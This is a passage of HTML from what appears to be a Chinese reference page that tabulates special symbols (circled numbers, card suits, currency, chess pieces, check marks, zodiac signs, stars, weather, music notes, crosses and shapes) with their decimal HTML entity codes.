            <td>ⓩ</td><td class="fuhao_text">&amp;#9449</td>
            <td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>㊀</td><td class="fuhao_text">&amp;#12928</td>
            <td>㊁</td><td class="fuhao_text">&amp;#12929</td>
            <td>㊂</td><td class="fuhao_text">&amp;#12930</td>
            <td>㊃</td><td class="fuhao_text">&amp;#12931</td>
            <td>㊄</td><td class="fuhao_text">&amp;#12932</td>
        </tr>
        <tr>
            <td>㊅</td><td class="fuhao_text">&amp;#12933</td>
            <td>㊆</td><td class="fuhao_text">&amp;#12934</td>
            <td>㊇</td><td class="fuhao_text">&amp;#12935</td>
            <td>㊈</td><td class="fuhao_text">&amp;#12936</td>
            <td>㊉</td><td class="fuhao_text">&amp;#12937</td>
        </tr>
        <tr>
            <td>⓵</td><td class="fuhao_text">&amp;#9461</td>
            <td>⓶</td><td class="fuhao_text">&amp;#9462</td>
            <td>⓷</td><td class="fuhao_text">&amp;#9463</td>
            <td>⓸</td><td class="fuhao_text">&amp;#9464</td>
            <td>⓹</td><td class="fuhao_text">&amp;#9465</td>
        </tr>
        <tr>
            <td>⓺</td><td class="fuhao_text">&amp;#9466</td>
            <td>⓻</td><td class="fuhao_text">&amp;#9467</td>
            <td>⓼</td><td class="fuhao_text">&amp;#9468</td>
            <td>⓽</td><td class="fuhao_text">&amp;#9469</td>
            <td>⓾</td><td class="fuhao_text">&amp;#9470</td>
        </tr>
        <tr>
            <td>⓪</td><td class="fuhao_text">&amp;#9450</td>
            <td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>㈠</td><td class="fuhao_text">&amp;#12832</td>
            <td>㈡</td><td class="fuhao_text">&amp;#12833</td>
            <td>㈢</td><td class="fuhao_text">&amp;#12834</td>
            <td>㈣</td><td class="fuhao_text">&amp;#12835</td>
            <td>㈤</td><td class="fuhao_text">&amp;#12836</td>
        </tr>
        <tr>
            <td>㈥</td><td class="fuhao_text">&amp;#12837</td>
            <td>㈦</td><td class="fuhao_text">&amp;#12838</td>
            <td>㈧</td><td class="fuhao_text">&amp;#12839</td>
            <td>㈨</td><td class="fuhao_text">&amp;#12840</td>
            <td>㈩</td><td class="fuhao_text">&amp;#12841</td>
        </tr>
    </tbody>
</table>

<h3>㊕&nbsp; 文字类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>㊋</td><td class="fuhao_text">&amp;#12939</td>
            <td>㊌</td><td class="fuhao_text">&amp;#12940</td>
            <td>㊍</td><td class="fuhao_text">&amp;#12941</td>
            <td>㊎</td><td class="fuhao_text">&amp;#12942</td>
            <td>㊏</td><td class="fuhao_text">&amp;#12943</td>
        </tr>
        <tr>
            <td>㊊</td><td class="fuhao_text">&amp;#12938</td>
            <td>㊐</td><td class="fuhao_text">&amp;#12944</td>
            <td>㊑</td><td class="fuhao_text">&amp;#12945</td>
            <td>㊒</td><td class="fuhao_text">&amp;#12946</td>
            <td>㊓</td><td class="fuhao_text">&amp;#12947</td>
        </tr>
        <tr>
            <td>㊔</td><td class="fuhao_text">&amp;#12948</td>
            <td>㊕</td><td class="fuhao_text">&amp;#12949</td>
            <td>㊖</td><td class="fuhao_text">&amp;#12950</td>
            <td>㊗</td><td class="fuhao_text">&amp;#12951</td>
            <td>㊘</td><td class="fuhao_text">&amp;#12952</td>
        </tr>
        <tr>
            <td>㊙</td><td class="fuhao_text">&amp;#12953</td>
            <td>㊚</td><td class="fuhao_text">&amp;#12954</td>
            <td>㊛</td><td class="fuhao_text">&amp;#12955</td>
            <td>㊜</td><td class="fuhao_text">&amp;#12956</td>
            <td>㊝</td><td class="fuhao_text">&amp;#12957</td>
        </tr>
        <tr>
            <td>㊞</td><td class="fuhao_text">&amp;#12958</td>
            <td>㊟</td><td class="fuhao_text">&amp;#12959</td>
            <td>㊠</td><td class="fuhao_text">&amp;#12960</td>
            <td>㊡</td><td class="fuhao_text">&amp;#12961</td>
            <td>㊢</td><td class="fuhao_text">&amp;#12962</td>
        </tr>
        <tr>
            <td>㊣</td><td class="fuhao_text">&amp;#12963</td>
            <td>㊤</td><td class="fuhao_text">&amp;#12964</td>
            <td>㊥</td><td class="fuhao_text">&amp;#12965</td>
            <td>㊦</td><td class="fuhao_text">&amp;#12966</td>
            <td>㊧</td><td class="fuhao_text">&amp;#12967</td>
        </tr>
        <tr>
            <td>㊨</td><td class="fuhao_text">&amp;#12968</td>
            <td>㊩</td><td class="fuhao_text">&amp;#12969</td>
            <td>㊪</td><td class="fuhao_text">&amp;#12970</td>
            <td>㊫</td><td class="fuhao_text">&amp;#12971</td>
            <td>㊬</td><td class="fuhao_text">&amp;#12972</td>
        </tr>
        <tr>
            <td>㊭</td><td class="fuhao_text">&amp;#12973</td>
            <td>㊮</td><td class="fuhao_text">&amp;#12974</td>
            <td>㊯</td><td class="fuhao_text">&amp;#12975</td>
            <td>㊰</td><td class="fuhao_text">&amp;#12976</td>
            <td>㋔</td><td class="fuhao_text">&amp;#13012</td>
        </tr>
        <tr>
            <td>㋕</td><td class="fuhao_text">&amp;#13013</td>
            <td>㋟</td><td class="fuhao_text">&amp;#13023</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>㍻</td><td class="fuhao_text">&amp;#13179</td>
            <td>㍼</td><td class="fuhao_text">&amp;#13180</td>
            <td>㍽</td><td class="fuhao_text">&amp;#13181</td>
            <td>㍾</td><td class="fuhao_text">&amp;#13182</td>
            <td>㍿</td><td class="fuhao_text">&amp;#13183</td>
        </tr>
        <tr>
            <td>㈪</td><td class="fuhao_text">&amp;#12842</td>
            <td>㈫</td><td class="fuhao_text">&amp;#12843</td>
            <td>㈬</td><td class="fuhao_text">&amp;#12844</td>
            <td>㈭</td><td class="fuhao_text">&amp;#12845</td>
            <td>㈮</td><td class="fuhao_text">&amp;#12846</td>
        </tr>
        <tr>
            <td>㈯</td><td class="fuhao_text">&amp;#12847</td>
            <td>㈰</td><td class="fuhao_text">&amp;#12848</td>
            <td>㈱</td><td class="fuhao_text">&amp;#12849</td>
            <td>㈲</td><td class="fuhao_text">&amp;#12850</td>
            <td>㈳</td><td class="fuhao_text">&amp;#12851</td>
        </tr>
        <tr>
            <td>㈴</td><td class="fuhao_text">&amp;#12852</td>
            <td>㈵</td><td class="fuhao_text">&amp;#12853</td>
            <td>㈶</td><td class="fuhao_text">&amp;#12854</td>
            <td>㈷</td><td class="fuhao_text">&amp;#12855</td>
            <td>㈸</td><td class="fuhao_text">&amp;#12856</td>
        </tr>
        <tr>
            <td>㈹</td><td class="fuhao_text">&amp;#12857</td>
            <td>㈺</td><td class="fuhao_text">&amp;#12858</td>
            <td>㈻</td><td class="fuhao_text">&amp;#12859</td>
            <td>㈼</td><td class="fuhao_text">&amp;#12860</td>
            <td>㈽</td><td class="fuhao_text">&amp;#12861</td>
        </tr>
        <tr>
            <td>㈾</td><td class="fuhao_text">&amp;#12862</td>
            <td>㈿</td><td class="fuhao_text">&amp;#12863</td>
            <td>㉀</td><td class="fuhao_text">&amp;#12864</td>
            <td>㉁</td><td class="fuhao_text">&amp;#12865</td>
            <td>㉂</td><td class="fuhao_text">&amp;#12866</td>
        </tr>
        <tr>
            <td>㉃</td><td class="fuhao_text">&amp;#12867</td>
            <td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>♣&nbsp; 扑克牌类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>♠</td><td class="fuhao_text">&amp;#9824</td>
            <td>♣</td><td class="fuhao_text">&amp;#9827</td>
            <td>♥</td><td class="fuhao_text">&amp;#9829</td>
            <td>♦</td><td class="fuhao_text">&amp;#9830</td>
        </tr>
        <tr>
            <td>♤</td><td class="fuhao_text">&amp;#9828</td>
            <td>♧</td><td class="fuhao_text">&amp;#9831</td>
            <td>♡</td><td class="fuhao_text">&amp;#9825</td>
            <td>♢</td><td class="fuhao_text">&amp;#9826</td>
        </tr>
    </tbody>
</table>

<h3>¥&nbsp; 货币类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>$</td><td class="fuhao_text">&amp;#36</td>
            <td>¢</td><td class="fuhao_text">&amp;#162</td>
            <td>£</td><td class="fuhao_text">&amp;#163</td>
            <td>¤</td><td class="fuhao_text">&amp;#164</td>
        </tr>
        <tr>
            <td>€</td><td class="fuhao_text">&amp;#8364</td>
            <td>¥</td><td class="fuhao_text">&amp;#165</td>
            <td>₱</td><td class="fuhao_text">&amp;#8369</td>
            <td>₹</td><td class="fuhao_text">&amp;#8377</td>
        </tr>
    </tbody>
</table>

<h3>©&nbsp; 法律符号 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>®</td><td class="fuhao_text">&amp;#174</td>
            <td>©</td><td class="fuhao_text">&amp;#169</td>
            <td>℗</td><td class="fuhao_text">&amp;#8471</td>
            <td>™</td><td class="fuhao_text">&amp;#153</td>
            <td>℠</td><td class="fuhao_text">&amp;#8480</td>
        </tr>
        <tr>
            <td>℡</td><td class="fuhao_text">&amp;#8481</td>
            <td>™</td><td class="fuhao_text">&amp;#8482</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>♚&nbsp; 国际象棋类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>♚</td><td class="fuhao_text">&amp;#9818</td>
            <td>♛</td><td class="fuhao_text">&amp;#9819</td>
            <td>♜</td><td class="fuhao_text">&amp;#9820</td>
            <td>♝</td><td class="fuhao_text">&amp;#9821</td>
            <td>♞</td><td class="fuhao_text">&amp;#9822</td>
        </tr>
        <tr>
            <td>♟</td><td class="fuhao_text">&amp;#9823</td>
            <td>♔</td><td class="fuhao_text">&amp;#9812</td>
            <td>♕</td><td class="fuhao_text">&amp;#9813</td>
            <td>♖</td><td class="fuhao_text">&amp;#9814</td>
            <td>♗</td><td class="fuhao_text">&amp;#9815</td>
        </tr>
        <tr>
            <td>♘</td><td class="fuhao_text">&amp;#9816</td>
            <td>♙</td><td class="fuhao_text">&amp;#9817</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>✖&nbsp; 对错号 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>☑</td><td class="fuhao_text">&amp;#9745</td>
            <td>☒</td><td class="fuhao_text">&amp;#9746</td>
            <td>☓</td><td class="fuhao_text">&amp;#9747</td>
            <td>✓</td><td class="fuhao_text">&amp;#10003</td>
            <td>✔</td><td class="fuhao_text">&amp;#10004</td>
        </tr>
        <tr>
            <td>✕</td><td class="fuhao_text">&amp;#10005</td>
            <td>✖</td><td class="fuhao_text">&amp;#10006</td>
            <td>✗</td><td class="fuhao_text">&amp;#10007</td>
            <td>✘</td><td class="fuhao_text">&amp;#10008</td>
            <td>✅</td><td class="fuhao_text">&amp;#9989</td>
        </tr>
        <tr>
            <td>❌</td><td class="fuhao_text">&amp;#10060</td>
            <td>❎</td><td class="fuhao_text">&amp;#10062</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>♒&nbsp; 星座类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>♈</td><td class="fuhao_text">&amp;#9800</td>
            <td>♉</td><td class="fuhao_text">&amp;#9801</td>
            <td>♊</td><td class="fuhao_text">&amp;#9802</td>
            <td>♋</td><td class="fuhao_text">&amp;#9803</td>
            <td>♌</td><td class="fuhao_text">&amp;#9804</td>
        </tr>
        <tr>
            <td>♍</td><td class="fuhao_text">&amp;#9805</td>
            <td>♎</td><td class="fuhao_text">&amp;#9806</td>
            <td>♏</td><td class="fuhao_text">&amp;#9807</td>
            <td>♐</td><td class="fuhao_text">&amp;#9808</td>
            <td>♑</td><td class="fuhao_text">&amp;#9809</td>
        </tr>
        <tr>
            <td>♒</td><td class="fuhao_text">&amp;#9810</td>
            <td>♓</td><td class="fuhao_text">&amp;#9811</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3> ★ 星星类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>≛</td><td class="fuhao_text">&amp;#8795</td>
            <td>⩮</td><td class="fuhao_text">&amp;#10862</td>
            <td>✡</td><td class="fuhao_text">&amp;#10017</td>
            <td>☪</td><td class="fuhao_text">&amp;#9770</td>
            <td>⚝</td><td class="fuhao_text">&amp;#9885</td>
        </tr>
        <tr>
            <td>⋆</td><td class="fuhao_text">&amp;#8902</td>
            <td>★</td><td class="fuhao_text">&amp;#9733</td>
            <td>☆</td><td class="fuhao_text">&amp;#9734</td>
            <td>✭</td><td class="fuhao_text">&amp;#10029</td>
            <td>✮</td><td class="fuhao_text">&amp;#10030</td>
        </tr>
        <tr>
            <td>☆</td><td class="fuhao_text">&amp;#9734</td>
            <td>✦</td><td class="fuhao_text">&amp;#10022</td>
            <td>✧</td><td class="fuhao_text">&amp;#10023</td>
            <td>✨</td><td class="fuhao_text">&amp;#10024</td>
            <td>✩</td><td class="fuhao_text">&amp;#10025</td>
        </tr>
        <tr>
            <td>✡</td><td class="fuhao_text">&amp;#10017</td>
            <td>✪</td><td class="fuhao_text">&amp;#10026</td>
            <td>✫</td><td class="fuhao_text">&amp;#10027</td>
            <td>✬</td><td class="fuhao_text">&amp;#10028</td>
            <td>✭</td><td class="fuhao_text">&amp;#10029</td>
        </tr>
        <tr>
            <td>✮</td><td class="fuhao_text">&amp;#10030</td>
            <td>✯</td><td class="fuhao_text">&amp;#10031</td>
            <td>✰</td><td class="fuhao_text">&amp;#10032</td>
            <td>✱</td><td class="fuhao_text">&amp;#10033</td>
            <td>✲</td><td class="fuhao_text">&amp;#10034</td>
        </tr>
        <tr>
            <td>✳</td><td class="fuhao_text">&amp;#10035</td>
            <td>✴</td><td class="fuhao_text">&amp;#10036</td>
            <td>✵</td><td class="fuhao_text">&amp;#10037</td>
            <td>✶</td><td class="fuhao_text">&amp;#10038</td>
            <td>✷</td><td class="fuhao_text">&amp;#10039</td>
        </tr>
        <tr>
            <td>✸</td><td class="fuhao_text">&amp;#10040</td>
            <td>✹</td><td class="fuhao_text">&amp;#10041</td>
            <td>✺</td><td class="fuhao_text">&amp;#10042</td>
            <td>✻</td><td class="fuhao_text">&amp;#10043</td>
            <td>✼</td><td class="fuhao_text">&amp;#10044</td>
        </tr>
        <tr>
            <td>✽</td><td class="fuhao_text">&amp;#10045</td>
            <td>✾</td><td class="fuhao_text">&amp;#10046</td>
            <td>✿</td><td class="fuhao_text">&amp;#10047</td>
            <td>❀</td><td class="fuhao_text">&amp;#10048</td>
            <td>❁</td><td class="fuhao_text">&amp;#10049</td>
        </tr>
        <tr>
            <td>❂</td><td class="fuhao_text">&amp;#10050</td>
            <td>❃</td><td class="fuhao_text">&amp;#10051</td>
            <td>❄</td><td class="fuhao_text">&amp;#10052</td>
            <td>❅</td><td class="fuhao_text">&amp;#10053</td>
            <td>❆</td><td class="fuhao_text">&amp;#10054</td>
        </tr>
        <tr>
            <td>❇</td><td class="fuhao_text">&amp;#10055</td>
            <td>❈</td><td class="fuhao_text">&amp;#10056</td>
            <td>❉</td><td class="fuhao_text">&amp;#10057</td>
            <td>❊</td><td class="fuhao_text">&amp;#10058</td>
            <td>❋</td><td class="fuhao_text">&amp;#10059</td>
        </tr>
        <tr>
            <td>⚛</td><td class="fuhao_text">&amp;#9883</td>
            <td>⁑</td><td class="fuhao_text">&amp;#8273</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3> ☀ 天气类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>☀</td><td class="fuhao_text">&amp;#9728</td>
            <td>☁</td><td class="fuhao_text">&amp;#9729</td>
            <td>☂</td><td class="fuhao_text">&amp;#9730</td>
            <td>☃</td><td class="fuhao_text">&amp;#9731</td>
            <td>☄</td><td class="fuhao_text">&amp;#9732</td>
        </tr>
        <tr>
            <td>☔</td><td class="fuhao_text">&amp;#9748</td>
            <td>☼</td><td class="fuhao_text">&amp;#9788</td>
            <td>☽</td><td class="fuhao_text">&amp;#9789</td>
            <td>☾</td><td class="fuhao_text">&amp;#9790</td>
            <td>⛄</td><td class="fuhao_text">&amp;#9924</td>
        </tr>
        <tr>
            <td>⛅</td><td class="fuhao_text">&amp;#9925</td>
            <td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>☺&nbsp; 表情类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>☹</td><td class="fuhao_text">&amp;#9785</td>
            <td>☺</td><td class="fuhao_text">&amp;#9786</td>
            <td>☻</td><td class="fuhao_text">&amp;#9787</td>
            <td>⚆</td><td class="fuhao_text">&amp;#9862</td>
            <td>⚇</td><td class="fuhao_text">&amp;#9863</td>
        </tr>
        <tr>
            <td>⚈</td><td class="fuhao_text">&amp;#9864</td>
            <td>⚉</td><td class="fuhao_text">&amp;#9865</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>♫&nbsp; 音乐符号类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>♩</td><td class="fuhao_text">&amp;#9833</td>
            <td>♪</td><td class="fuhao_text">&amp;#9834</td>
            <td>♫</td><td class="fuhao_text">&amp;#9835</td>
            <td>♬</td><td class="fuhao_text">&amp;#9836</td>
        </tr>
        <tr>
            <td>♭</td><td class="fuhao_text">&amp;#9837</td>
            <td>♯</td><td class="fuhao_text">&amp;#9839</td>
            <td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>☩&nbsp; 十字符 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>†</td><td class="fuhao_text">&amp;#8224</td>
            <td>⊹</td><td class="fuhao_text">&amp;#8889</td>
            <td>⋕</td><td class="fuhao_text">&amp;#8917</td>
            <td>⋇</td><td class="fuhao_text">&amp;#8903</td>
        </tr>
        <tr>
            <td>☨</td><td class="fuhao_text">&amp;#9768</td>
            <td>☩</td><td class="fuhao_text">&amp;#9769</td>
            <td>♰</td><td class="fuhao_text">&amp;#9840</td>
            <td>♱</td><td class="fuhao_text">&amp;#9841</td>
        </tr>
        <tr>
            <td>✙</td><td class="fuhao_text">&amp;#10009</td>
            <td>✚</td><td class="fuhao_text">&amp;#10010</td>
            <td>✛</td><td class="fuhao_text">&amp;#10011</td>
            <td>✜</td><td class="fuhao_text">&amp;#10012</td>
        </tr>
        <tr>
            <td>✝</td><td class="fuhao_text">&amp;#10013</td>
            <td>✞</td><td class="fuhao_text">&amp;#10014</td>
            <td>✟</td><td class="fuhao_text">&amp;#10015</td>
            <td>✠</td><td class="fuhao_text">&amp;#10016</td>
        </tr>
        <tr>
            <td>✢</td><td class="fuhao_text">&amp;#10018</td>
            <td>✤</td><td class="fuhao_text">&amp;#10020</td>
            <td>✣</td><td class="fuhao_text">&amp;#10019</td>
            <td>✥</td><td class="fuhao_text">&amp;#10021</td>
        </tr>
    </tbody>
</table>

<h3>⊕&nbsp; 圈圈叉叉 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>⊕</td><td class="fuhao_text">&amp;#8853</td>
            <td>⊖</td><td class="fuhao_text">&amp;#8854</td>
            <td>⊗</td><td class="fuhao_text">&amp;#8855</td>
            <td>⊘</td><td class="fuhao_text">&amp;#8856</td>
            <td>⊙</td><td class="fuhao_text">&amp;#8857</td>
        </tr>
        <tr>
            <td>⊚</td><td class="fuhao_text">&amp;#8858</td>
            <td>⊛</td><td class="fuhao_text">&amp;#8859</td>
            <td>⊜</td><td class="fuhao_text">&amp;#8860</td>
            <td>⊝</td><td class="fuhao_text">&amp;#8861</td>
            <td>⨀</td><td class="fuhao_text">&amp;#10752</td>
        </tr>
        <tr>
            <td>⨁</td><td class="fuhao_text">&amp;#10753</td>
            <td>⨂</td><td class="fuhao_text">&amp;#10754</td>
            <td>⊞</td><td class="fuhao_text">&amp;#8862</td>
            <td>⊟</td><td class="fuhao_text">&amp;#8863</td>
            <td>⊠</td><td class="fuhao_text">&amp;#8864</td>
        </tr>
        <tr>
            <td>⊡</td><td class="fuhao_text">&amp;#8865</td>
            <td>◈</td><td class="fuhao_text">&amp;#9672</td>
            <td>◉</td><td class="fuhao_text">&amp;#9673</td>
            <td>◊</td><td class="fuhao_text">&amp;#9674</td>
            <td>○</td><td class="fuhao_text">&amp;#9675</td>
        </tr>
        <tr>
            <td>⊶</td><td class="fuhao_text">&amp;#8886</td>
            <td>⊷</td><td class="fuhao_text">&amp;#8887</td>
            <td>⊸</td><td class="fuhao_text">&amp;#8888</td>
            <td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>◌</td><td class="fuhao_text">&amp;#9676</td>
            <td>◍</td><td class="fuhao_text">&amp;#9677</td>
            <td>◎</td><td class="fuhao_text">&amp;#9678</td>
            <td>●</td><td class="fuhao_text">&amp;#9679</td>
            <td>◐</td><td class="fuhao_text">&amp;#9680</td>
        </tr>
        <tr>
            <td>◑</td><td class="fuhao_text">&amp;#9681</td>
            <td>◒</td><td class="fuhao_text">&amp;#9682</td>
            <td>◓</td><td class="fuhao_text">&amp;#9683</td>
            <td>◔</td><td class="fuhao_text">&amp;#9684</td>
            <td>◕</td><td class="fuhao_text">&amp;#9685</td>
        </tr>
        <tr>
            <td>⨶</td><td class="fuhao_text">&amp;#10806</td>
            <td>⨷</td><td class="fuhao_text">&amp;#10807</td>
            <td>⨸</td><td class="fuhao_text">&amp;#10808</td>
            <td>⨹</td><td class="fuhao_text">&amp;#10809</td>
            <td>☉</td><td class="fuhao_text">&amp;#9737</td>
        </tr>
        <tr>
            <td>☊</td><td class="fuhao_text">&amp;#9738</td>
            <td>☋</td><td class="fuhao_text">&amp;#9739</td>
            <td>☌</td><td class="fuhao_text">&amp;#9740</td>
            <td>☿</td><td class="fuhao_text">&amp;#9791</td>
            <td>♀</td><td class="fuhao_text">&amp;#9792</td>
        </tr>
        <tr>
            <td>♁</td><td class="fuhao_text">&amp;#9793</td>
            <td>♂</td><td class="fuhao_text">&amp;#9794</td>
            <td>⚢</td><td class="fuhao_text">&amp;#9890</td>
            <td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>⚣</td><td class="fuhao_text">&amp;#9891</td>
            <td>⚤</td><td class="fuhao_text">&amp;#9892</td>
            <td>⚥</td><td class="fuhao_text">&amp;#9893</td>
            <td>⚦</td><td class="fuhao_text">&amp;#9894</td>
            <td>⚧</td><td class="fuhao_text">&amp;#9895</td>
        </tr>
        <tr>
            <td>⚨</td><td class="fuhao_text">&amp;#9896</td>
            <td>⚩</td><td class="fuhao_text">&amp;#9897</td>
            <td>⚳</td><td class="fuhao_text">&amp;#9907</td>
            <td>⚴</td><td class="fuhao_text">&amp;#9908</td>
            <td>⚵</td><td class="fuhao_text">&amp;#9909</td>
        </tr>
        <tr>
            <td>◈</td><td class="fuhao_text">&amp;#9672</td>
            <td>▣</td><td class="fuhao_text">&amp;#9635</td>
            <td>⚀</td><td class="fuhao_text">&amp;#9856</td>
            <td>⚁</td><td class="fuhao_text">&amp;#9857</td>
            <td>⚂</td><td class="fuhao_text">&amp;#9858</td>
        </tr>
        <tr>
            <td>⚃</td><td class="fuhao_text">&amp;#9859</td>
            <td>⚄</td><td class="fuhao_text">&amp;#9860</td>
            <td>⚅</td><td class="fuhao_text">&amp;#9861</td>
            <td>⚪</td><td class="fuhao_text">&amp;#9898</td>
            <td>⚫</td><td class="fuhao_text">&amp;#9899</td>
        </tr>
        <tr>
            <td>⚬</td><td class="fuhao_text">&amp;#9900</td>
            <td>⚭</td><td class="fuhao_text">&amp;#9901</td>
            <td>⚮</td><td class="fuhao_text">&amp;#9902</td>
            <td>⚯</td><td class="fuhao_text">&amp;#9903</td>
            <td>⌘</td><td class="fuhao_text">&amp;#8984</td>
        </tr>
        <tr>
            <td>❏</td><td class="fuhao_text">&amp;#10063</td>
            <td>❐</td><td class="fuhao_text">&amp;#10064</td>
            <td>❑</td><td class="fuhao_text">&amp;#10065</td>
            <td>❒</td><td class="fuhao_text">&amp;#10066</td>
            <td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>☷&nbsp; 文件 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>⚊</td><td class="fuhao_text">&amp;#9866</td>
            <td>⚋</td><td class="fuhao_text">&amp;#9867</td>
            <td>⚌</td><td class="fuhao_text">&amp;#9868</td>
            <td>⚍</td><td class="fuhao_text">&amp;#9869</td>
            <td>⚎</td><td class="fuhao_text">&amp;#9870</td>
        </tr>
        <tr>
            <td>⚏</td><td class="fuhao_text">&amp;#9871</td>
            <td>☰</td><td class="fuhao_text">&amp;#9776</td>
            <td>☱</td><td class="fuhao_text">&amp;#9777</td>
            <td>☲</td><td class="fuhao_text">&amp;#9778</td>
            <td>☳</td><td class="fuhao_text">&amp;#9779</td>
        </tr>
        <tr>
            <td>☴</td><td class="fuhao_text">&amp;#9780</td>
            <td>☵</td><td class="fuhao_text">&amp;#9781</td>
            <td>☶</td><td class="fuhao_text">&amp;#9782</td>
            <td>☷</td><td class="fuhao_text">&amp;#9783</td>
            <td></td><td></td>
        </tr>
    </tbody>
</table>

<h3>❤ 基本形状类</h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>☎</td><td class="fuhao_text">&amp;#9742</td>
            <td>☏</td><td class="fuhao_text">&amp;#9743</td>
            <td>☕</td><td class="fuhao_text">&amp;#9749</td>
            <td>☖</td><td class="fuhao_text">&amp;#9750</td>
            <td>☗</td><td class="fuhao_text">&amp;#9751</td>
        </tr>
        <tr>
            <td>☘</td><td class="fuhao_text">&amp;#9752</td>
            <td>☙</td><td class="fuhao_text">&amp;#9753</td>
            <td>☠</td><td class="fuhao_text">&amp;#9760</td>
            <td>☡</td><td class="fuhao_text">&amp;#9761</td>
            <td>☢</td><td class="fuhao_text">&amp;#9762</td>
        </tr>
        <tr>
            <td>☣</td><td class="fuhao_text">&amp;#9763</td>
            <td>☤</td><td class="fuhao_text">&amp;#9764</td>
            <td>☥</td><td class="fuhao_text">&amp;#9765</td>
            <td>☦</td><td class="fuhao_text">&amp;#9766</td>
            <td>☧</td><td class="fuhao_text">&amp;#9767</td>
        </tr>
        <tr>
            <td>☫</td><td class="fuhao_text">&amp;#9771</td>
            <td>☬</td><td class="fuhao_text">&amp;#9772</td>
            <td>☭</td><td class="fuhao_text">&amp;#9773</td>
